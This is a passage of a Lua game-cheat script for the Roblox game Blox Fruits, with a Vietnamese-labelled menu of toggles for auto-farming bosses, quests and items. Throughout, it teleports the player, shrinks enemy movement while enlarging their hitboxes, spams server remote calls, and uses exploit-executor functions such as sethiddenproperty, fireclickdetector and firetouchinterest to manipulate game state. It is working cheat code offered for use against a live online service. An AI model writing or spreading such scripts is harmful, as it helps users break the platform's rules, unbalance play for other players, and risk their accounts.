                                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Urban").HumanoidRootPart.CFrame*CFrame.new(2,20,2))
                                   end
                               end
                           end
                       else
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                       end
                   end)
               end
           end
       end)
    end
if Sea3 then
    local AutoMysticIsland = Tabs.Sea:AddSection("Đảo Bí Ẩn")
    local StatusMirage = Tabs.Sea:AddParagraph({
        Title="Trạng Thái",
        Content=""
    })
    task.spawn(function()
        while task.wait() do
            pcall(function()
                local moonTextureId = game:GetService("Lighting").Sky.MoonTextureId
                if moonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
                    FullMoonStatus="100%"
                elseif moonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
                    FullMoonStatus="75%"
                elseif moonTextureId=="http://www.roblox.com/asset/?id=9709143733" then
                    FullMoonStatus="50%"
                elseif moonTextureId=="http://www.roblox.com/asset/?id=9709150401" then
                    FullMoonStatus="25%"
                elseif moonTextureId=="http://www.roblox.com/asset/?id=9709149680" then
                    FullMoonStatus="15%"
                else
                    FullMoonStatus="0%"
                end
            end)
        end
    end)
    task.spawn(function()
        while task.wait() do
            pcall(function()
                if game.Workspace.Map:FindFirstChild("MysticIsland") then
                    MirageStatus="✅️"
                else
                    MirageStatus="❌️"
                end
            end)
        end
    end)
    spawn(function()
        pcall(function()
            while wait() do
                StatusMirage:SetDesc("Đảo Bí Ẩn: " .. MirageStatus .. " | Trăng Tròn: " .. FullMoonStatus)
            end
        end)
    end)
    Tabs.Sea:AddButton({
        Title="Bay Đến Chỗ Cao",
        Description="",
        Callback=function()
            TweenToHighestPoint()
        end
    })
    function TweenToHighestPoint()
        local HighestPoint = getHighestPoint()
        if HighestPoint then
            Tween(HighestPoint.CFrame*CFrame.new(0, 211.88, 0))
        end
    end
    function getHighestPoint()
        if not game.Workspace.Map:FindFirstChild("MysticIsland") then
            return nil
        end
        for _, v in pairs(game:GetService("Workspace").Map.MysticIsland:GetDescendants()) do
            if v:IsA("MeshPart") then
                if v.MeshId=="rbxassetid://6745037796" then
                    return v
                end
            end
        end
    end
end
local ToggleTpAdvanced = Tabs.Sea:AddToggle("ToggleTpAdvanced", {
    Title="Bay Đến Advanced Fruit Dealer", 
    Description="", 
    Default=false
})
ToggleTpAdvanced:OnChanged(function(Value)
    _G.AutoTpAdvanced=Value
end)
spawn(function()
    while wait() do
        if _G.AutoTpAdvanced then
            local advancedFruitDealer = game.ReplicatedStorage.NPCs:FindFirstChild("Advanced Fruit Dealer")
            if advancedFruitDealer and advancedFruitDealer:IsA("Model") then
                local dealerPosition = advancedFruitDealer.PrimaryPart and advancedFruitDealer.PrimaryPart.Position
                if dealerPosition then
                    Tween(CFrame.new(dealerPosition))
                end
            end
        end
    end
end)
local ToggleTweenGear = Tabs.Sea:AddToggle("ToggleTweenGear", {Title="Bay Đến Bánh Răng",Description="", Default=false })
ToggleTweenGear:OnChanged(function(Value)
    _G.TweenToGear=Value
end) 
Options.ToggleTweenGear:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if _G.TweenToGear then
                if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                    for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                        if v:IsA("MeshPart")then 
                            if v.Material==Enum.Material.Neon then  
                                Tween(v.CFrame)
                            end
                        end
                    end
                end
            end
        end
    end)
    end)
local Togglelockmoon = Tabs.Sea:AddToggle("Togglelockmoon", {
    Title="Nhìn Trăng Và Dùng Tộc",
    Description="",
    Default=false
})
Togglelockmoon:OnChanged(function(Value)
    _G.AutoLockMoon=Value
end)
Options.Togglelockmoon:SetValue(false)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoLockMoon then
                local moonDir = game.Lighting:GetMoonDirection()
                local lookAtPos = game.Workspace.CurrentCamera.CFrame.p+moonDir*100
                game.Workspace.CurrentCamera.CFrame=CFrame.lookAt(
                    game.Workspace.CurrentCamera.CFrame.p,
                    lookAtPos
                )
            end
        end)
    end
end)
spawn(function()
    while wait() do
        pcall(function()
            if _G.AutoLockMoon then
                game:GetService("ReplicatedStorage").Remotes.CommE:FireServer("ActivateAbility")
            end
        end)
    end
end)
local ToggleAutoSaber = Tabs.Item:AddToggle("ToggleAutoSaber", {
    Title="Saber",
    Description="",
    Default=false
})
ToggleAutoSaber:OnChanged(function(Value)
    _G.Auto_Saber=Value
end)
Options.ToggleAutoSaber:SetValue(false)
spawn(function()
    while task.wait() do
        if _G.Auto_Saber and game.Players.LocalPlayer.Data.Level.Value>=200 then
            pcall(function()
                if game:GetService("Workspace").Map.Jungle.Final.Part.Transparency==0 then
                    if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.Transparency==0 then
                        if (CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-09,-0.928667724, 3.97099491e-08, 1, 1.91679348e-08, 0.928667724,-4.39869794e-08, 0.37091279).Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Map.Jungle.QuestPlates.Plate1.Button.CFrame
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Map.Jungle.QuestPlates.Plate2.Button.CFrame
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Map.Jungle.QuestPlates.Plate3.Button.CFrame
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Map.Jungle.QuestPlates.Plate4.Button.CFrame
                            wait(1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Map.Jungle.QuestPlates.Plate5.Button.CFrame
                            wait(1)
                        else
                            Tween(CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 3.0717151e-09,-0.928667724, 3.97099491e-08, 1, 1.91679348e-08, 0.928667724,-4.39869794e-08, 0.37091279))
                        end
                    else
                        if game:GetService("Workspace").Map.Desert.Burn.Part.Transparency==0 then
                            if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Torch") then
                                EquipWeapon("Torch")
                                Tween(CFrame.new(1114.61475, 5.04679728, 4350.22803,-0.648466587,-1.28799094e-09, 0.761243105,-5.70652914e-10, 1, 1.20584542e-09,-0.761243105, 3.47544882e-10,-0.648466587))
                            else
                                Tween(CFrame.new(-1610.00757, 11.5049858, 164.001587, 0.984807551,-0.167722285,-0.0449818149, 0.17364943, 0.951244235, 0.254912198, 3.42372805e-05,-0.258850515, 0.965917408))
                            end
                        else
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan") ~=0 then
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup")
                                wait(0.5)
                                EquipWeapon("Cup")
                                wait(0.5)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "FillCup", game:GetService("Players").LocalPlayer.Character.Cup)
                                wait(0)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan")
                            else
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")==nil then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")==0 then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Mob Leader") or game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader") then
                                        Tween(CFrame.new(-2853.787109375, 3.8000030517578125, 5432.4208984375))
                                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name=="Mob Leader" then
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Mob Leader [Lv. 120] [Boss]") then
                                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                                        repeat
                                                            task.wait(_G.Fast_Delay)
                                                            Click()


AutoHaki()
                                                            EquipWeapon(SelectWeapon)
                                                            v.HumanoidRootPart.CanCollide=false
                                                            v.Humanoid.WalkSpeed=0
                                                            v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                                            Tween(v.HumanoidRootPart.CFrame*Pos)
                                                            
                                                        until v.Humanoid.Health<=0 or not _G.Auto_Saber
                                                    end
                                                end
                                                if game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader") then
                                                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader").HumanoidRootPart.CFrame*Pos)
                                                end
                                            end
                                        end
                                    end
                                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")==1 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                                    wait(0.5)
                                    EquipWeapon("Relic")
                                    wait(0.5)
                                    Tween(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-09, 0.481375456, 2.53851997e-08, 1,-5.79995607e-08,-0.481375456, 6.30572643e-08, 0.876514494))
                                end
                            end
                        end
                    end
                else
                    if game:GetService("Workspace").Enemies:FindFirstChild("Saber Expert") or game:GetService("ReplicatedStorage"):FindFirstChild("Saber Expert") then
                        for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                if v.Name=="Saber Expert" then
                                    repeat
                                        task.wait(_G.Fast_Delay)
                                        EquipWeapon(SelectWeapon)
                                        Tween(v.HumanoidRootPart.CFrame*Pos)
                                        v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                        v.HumanoidRootPart.Transparency=1
                                        v.Humanoid.JumpPower=0
                                        v.Humanoid.WalkSpeed=0
                                        v.HumanoidRootPart.CanCollide=false
                                        bringmob=true
                                        FarmPos=v.HumanoidRootPart.CFrame
                                        MonFarm=v.Name
                                        
                                    until v.Humanoid.Health<=0 or not _G.Auto_Saber
                                    bringmob=true
                                    if v.Humanoid.Health<=0 then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "PlaceRelic")
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        end
    end
end)
local ToggleAutoPoleV1 = Tabs.Item:AddToggle("ToggleAutoPoleV1", {
    Title="Pole V1",
    Description="",
    Default=false
})
ToggleAutoPoleV1:OnChanged(function(Value)
    _G.Auto_PoleV1=Value
end)
Options.ToggleAutoPoleV1:SetValue(false)
local PolePos = CFrame.new(-7748.0185546875, 5606.80615234375,-2305.898681640625)
spawn(function()
    while wait() do
        if _G.Auto_PoleV1 then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Thunder God") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="Thunder God" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                until not _G.Auto_PoleV1 or not v.Parent or v.Humanoid.Health<=0
                            end
                        end
                    end
                else
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-PolePos.Position).Magnitude<1000000000 then
                        Tween(PolePos)
                    end
                end
                Tween(CFrame.new(-7748.0185546875, 5606.80615234375,-2305.898681640625))
                if game:GetService("ReplicatedStorage"):FindFirstChild("Thunder God") then
                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Thunder God").HumanoidRootPart.CFrame*Pos)
                end
            end)
        end
    end
end)
local ToggleAutoSaw = Tabs.Item:AddToggle("ToggleAutoSaw", {
    Title="Cưa Cá Mập",
    Description="",
    Default=false
})
ToggleAutoSaw:OnChanged(function(Value)
    _G.Auto_Saw=Value
end)
Options.ToggleAutoSaw:SetValue(false)
local PolePos = CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094)
spawn(function()
    while wait() do
        if _G.Auto_Saw then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("The Saw") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="The Saw" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                until not _G.Auto_Saw or not v.Parent or v.Humanoid.Health<=0
                            end
                        end
                    end
                else
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-PolePos.Position).Magnitude<1000000000 then
                        Tween(PolePos)
                    end
                end
                Tween(CFrame.new(-690.33081054688, 15.09425163269, 1582.2380371094))
                if game:GetService("ReplicatedStorage"):FindFirstChild("The Saw") then
                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("The Saw").HumanoidRootPart.CFrame*Pos)
                end
            end)
        end
    end
end)
local ToggleAutoWarden = Tabs.Item:AddToggle("ToggleAutoWarden", {
    Title="Kiếm Quản Ngục",
    Description="",
    Default=false
})
ToggleAutoWarden:OnChanged(function(Value)
    _G.Auto_Warden=Value
end)
Options.ToggleAutoWarden:SetValue(false)
local WardenPos = CFrame.new(5186.14697265625, 24.86684226989746, 832.1885375976562)
spawn(function()
    while wait() do
        if _G.Auto_Warden then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Chief Warden") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="Chief Warden" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                until not _G.Auto_Warden or not v.Parent or v.Humanoid.Health<=0
                            end
                        end
                    end
                else
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-WardenPos.Position).Magnitude<1000000000 then
                        Tween(WardenPos)
                    end
                end
                Tween(CFrame.new(5186.14697265625, 24.86684226989746, 832.1885375976562))
                if game:GetService("ReplicatedStorage"):FindFirstChild("Chief Warden") then
                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Chief Warden").HumanoidRootPart.CFrame*Pos)
                end
            end)
        end
    end
end)
if Sea3 then
    local ToggleHallow = Tabs.Item:AddToggle("ToggleHallow", {Title="Lưỡi Hái",Description="", Default=false })
    ToggleHallow:OnChanged(function(Value)
        AutoHallowSycthe=Value
    end)
    Options.ToggleHallow:SetValue(false)
    spawn(function()
        while wait() do
            if AutoHallowSycthe then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if string.find(v.Name , "Soul Reaper") then
                                repeat wait(_G.Fast_Delay)
                                    
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.Transparency=1
                                    sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                                until v.Humanoid.Health<=0 or AutoHallowSycthe==false
                            end
                        end
                    elseif game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hallow Essence") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Hallow Essence") then
                        repeat Tween(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125)) wait() until (CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125).Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000                        
                      wait()
                        EquipWeapon("Hallow Essence")
                    else
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Soul Reaper") then
                            Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Soul Reaper").HumanoidRootPart.CFrame*Pos)
                        else
                        end
                    end
                end)
            end
        end
    end)
    spawn(function()
           while wait() do
           if AutoHallowSycthe then
           local args = {
            [1]="Bones",
            [2]="Buy",
            [3]=1,
            [4]=1
           }
           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
           end
           end
           end)       
           local ToggleYama = Tabs.Item:AddToggle("ToggleYama", {Title="Yama",Description="", Default=false })
           ToggleYama:OnChanged(function(Value)
            _G.AutoYama=Value
           end)
           Options.ToggleYama:SetValue(false)
           spawn(function()
            while wait() do
                if _G.AutoYama then
                    if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress")>=30 then
                        repeat wait()
                            fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                        until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Yama") or not _G.AutoYama
                    end
                end
            end
        end)
        local ToggleTushita = Tabs.Item:AddToggle("ToggleTushita", {Title="Tushita",Description="", Default=false })
        ToggleTushita:OnChanged(function(Value)
            AutoTushita=Value
        end)
        Options.ToggleTushita:SetValue(false)
           spawn(function()
                   while wait() do
                               if AutoTushita then
                                   if game:GetService("Workspace").Enemies:FindFirstChild("Longma") then
                                       for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                           if v.Name==("Longma" or v.Name=="Longma") and v.Humanoid.Health>0 and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                                            repeat wait(_G.Fast_Delay)
                                                
                                                   Click()


AutoHaki()
                                                   if not game.Players.LocalPlayer.Character:FindFirstChild(SelectWeapon) then
                                                       wait()
                                                       EquipWeapon(SelectWeapon)
                                                   end
                                                   FarmPos=v.HumanoidRootPart.CFrame
                                                   v.HumanoidRootPart.Size=Vector3.new(60, 60, 60)
                                                   v.Humanoid.JumpPower=0
                                                   v.Humanoid.WalkSpeed=0
                                                   v.HumanoidRootPart.CanCollide=false
                                                   v.Humanoid:ChangeState(11)
                                                   Tween(v.HumanoidRootPart.CFrame*Pos)
                                               until not AutoTushita or not v.Parent or v.Humanoid.Health<=0
                                           end
                                       end
                                   else
                                       Tween(CFrame.new(-10238.875976563, 389.7912902832,-9549.7939453125))
                                   end
                               end
                           end
                   end)
                   local ToggleHoly = Tabs.Item:AddToggle("ToggleHoly", {Title="Đốt Đuốc",Description="", Default=false })
                   ToggleHoly:OnChanged(function(Value)
                    _G.Auto_Holy_Torch=Value
                   end)
                   Options.ToggleHoly:SetValue(false)
                   spawn(function()
                    while wait() do
                        if _G.Auto_Holy_Torch then
                            pcall(function()
                                wait()
                                repeat Tween(CFrame.new(-10752, 417,-9366)) wait() until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-10752, 417,-9366)).Magnitude<=1000000000
                                wait()
                                repeat Tween(CFrame.new(-11672, 334,-9474)) wait() until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-11672, 334,-9474)).Magnitude<=1000000000
                                wait()
                                repeat Tween(CFrame.new(-12132, 521,-10655)) wait() until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-12132, 521,-10655)).Magnitude<=1000000000
                                wait()
                                repeat Tween(CFrame.new(-13336, 486,-6985)) wait() until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-13336, 486,-6985)).Magnitude<=1000000000
                                wait()
                                repeat Tween(CFrame.new(-13489, 332,-7925)) wait() until not _G.Auto_Holy_Torch or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-13489, 332,-7925)).Magnitude<=1000000000
                            end)
                        end
                    end
                end)
            end
local ToggleAutoCanvander = Tabs.Item:AddToggle("ToggleAutoCanvander", {
    Title="Canvander",
    Description="",
    Default=false
})
ToggleAutoCanvander:OnChanged(function(Value)
    _G.Auto_Canvander=Value
end)
Options.ToggleAutoCanvander:SetValue(false)
local PolePos = CFrame.new(5311.07421875, 426.0243835449219, 165.12762451171875)
spawn(function()
    while wait() do
        if _G.Auto_Canvander then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Beautiful Pirate") then
                    for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name=="Beautiful Pirate" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health>0 then
                                repeat
                                    task.wait(_G.Fast_Delay)
                                    Click()


AutoHaki()
                                    EquipWeapon(SelectWeapon)
                                    v.HumanoidRootPart.CanCollide=false
                                    v.Humanoid.WalkSpeed=0
                                    v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                    Tween(v.HumanoidRootPart.CFrame*Pos)
                                    
                                until not _G.Auto_Canvander or not v.Parent or v.Humanoid.Health<=0
                            end
                        end
                    end
                else
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-PolePos.Position).Magnitude<1000000000 then
                        Tween(PolePos)
                    end
                end
                Tween(CFrame.new(5311.07421875, 426.0243835449219, 165.12762451171875))
                if game:GetService("ReplicatedStorage"):FindFirstChild("Beautiful Pirate") then
                    Tween(game:GetService("ReplicatedStorage"):FindFirstChild("Beautiful Pirate").HumanoidRootPart.CFrame*Pos)
                end
            end)
        end
    end
end)
local ToggleAutoMusketeerHat = Tabs.Item:AddToggle("ToggleAutoMusketeerHat", {
    Title="Mũ Lính Ngự Lâm",
    Description="",
    Default=false
})
ToggleAutoMusketeerHat:OnChanged(function(Value)
    _G.Auto_MusketeerHat=Value
end)
Options.ToggleAutoMusketeerHat:SetValue(false)
spawn(function()
    pcall(function()
        while wait(0.1) do
            if _G.Auto_MusketeerHat then
                if game:GetService("Players").LocalPlayer.Data.Level.Value>=1800 and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress").KilledBandits==false then
                    if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Forest Pirate") and 
                       string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and 
                       game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==true then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Forest Pirate") then
                            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name=="Forest Pirate" then
                                    repeat
                                        task.wait(_G.Fast_Delay)
                                        pcall(function()
                                            EquipWeapon(SelectWeapon)
                                            Click()


AutoHaki()
                                            v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                            Tween(v.HumanoidRootPart.CFrame*Pos)
                                            v.HumanoidRootPart.CanCollide=false
                                            
                                            PosMon=v.HumanoidRootPart.CFrame
                                            MonFarm=v.Name
                                            bringmob=true
                                        end)
                                    until _G.Auto_MusketeerHat==false or not v.Parent or v.Humanoid.Health<=0 or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==false
                                    bringmob=false
                                end
                            end
                        else
                            bringmob=false
                            Tween(CFrame.new(-13206.452148438, 425.89199829102,-7964.5537109375))
                        end
                    else
                        Tween(CFrame.new(-12443.8671875, 332.40396118164,-7675.4892578125))
                        if (Vector3.new(-12443.8671875, 332.40396118164,-7675.4892578125)-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            wait(1.5)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", "CitizenQuest", 1)
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Level.Value>=1800 and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress").KilledBoss==false then
                    if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible and 
                       string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") and 
                       game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==true then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Captain Elephant") then
                            for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name=="Captain Elephant" then
                                    OldCFrameElephant=v.HumanoidRootPart.CFrame
                                    repeat
                                        task.wait(_G.Fast_Delay)
                                        pcall(function()
                                            EquipWeapon(SelectWeapon)
                                            Click()


AutoHaki()
                                            v.HumanoidRootPart.CanCollide=false
                                            v.HumanoidRootPart.Size=Vector3.new(50, 50, 50)
                                            Tween(v.HumanoidRootPart.CFrame*Pos)
                                            v.HumanoidRootPart.CanCollide=false
                                            v.HumanoidRootPart.CFrame=OldCFrameElephant
                                            
                                        end)
                                    until _G.Auto_MusketeerHat==false or v.Humanoid.Health<=0 or not v.Parent or game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible==false
                                end
                            end
                        else
                            Tween(CFrame.new(-13374.889648438, 421.27752685547,-8225.208984375))
                        end
                    else
                        Tween(CFrame.new(-12443.8671875, 332.40396118164,-7675.4892578125))
                        if (CFrame.new(-12443.8671875, 332.40396118164,-7675.4892578125).Position-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000 then
                            wait(1.5)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")
                        end
                    end
                elseif game:GetService("Players").LocalPlayer.Data.Level.Value>=1800 and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")==2 then
                    Tween(CFrame.new(-12512.138671875, 340.39279174805,-9872.8203125))
                end
            end
        end
    end)
end)
local ToggleAutoObservationV2 = Tabs.Item:AddToggle("ToggleAutoObservationV2", {
    Title="Haki Quan Sát V2",
    Description="",
    Default=false
})
ToggleAutoObservationV2:OnChanged(function(Value)
    _G.Auto_ObservationV2=Value
end)
Options.ToggleAutoObservationV2:SetValue(false)
spawn(function()
    while wait() do
        pcall(function()
            if _G.Auto_ObservationV2 then
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")==3 then
                    _G.Auto_MusketeerHat=false
                    if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Banana") 
                        and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Apple") 
                        and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Pineapple") then
                        repeat 
                            Tween(CFrame.new(-12444.78515625, 332.40396118164,-7673.1806640625)) 
                            wait() 
                        until not _G.Auto_ObservationV2 
                            or (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-12444.78515625, 332.40396118164,-7673.1806640625)).Magnitude<=1000000000
                        wait(0.5)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")
                    elseif game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fruit Bowl") 
                        or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Fruit Bowl") then
                        repeat 
                            Tween(CFrame.new(-10920.125, 624.20275878906,-10266.995117188)) 
                            wait() 
                        until not _G.Auto_ObservationV2 
                            or (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-10920.125, 624.20275878906,-10266.995117188)).Magnitude<=1000000000
                        wait(0.5)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk2", "Start")
                        wait(1)
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("KenTalk2", "Buy")
                    else
                        for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                            if v.Name=="Apple" or v.Name=="Banana" or v.Name=="Pineapple" then
                                v.Handle.CFrame=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0, 1, 10)
                                wait()
                                firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, v.Handle, 0)    
                                wait()
                            end
                        end   
                    end
                else
                    _G.Auto_MusketeerHat=true
                end
            end
        end)
    end
end)
local ToggleAutoRainbowHaki = Tabs.Item:AddToggle("ToggleAutoRainbowHaki", {
    Title="Haki 7 Màu",
    Description="",
    Default=false
})
ToggleAutoRainbowHaki:OnChanged(function(Value)
    _G.Auto_RainbowHaki=Value
end)
Options.ToggleAutoRainbowHaki:SetValue(false)
spawn(function()
    pcall(function()
        while wait(0.1) do
            if _G.Auto_RainbowHaki then
                if not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible then
                    Tween(CFrame.new(-11892.0703125, 930.57672119141,-8760.1591796875))
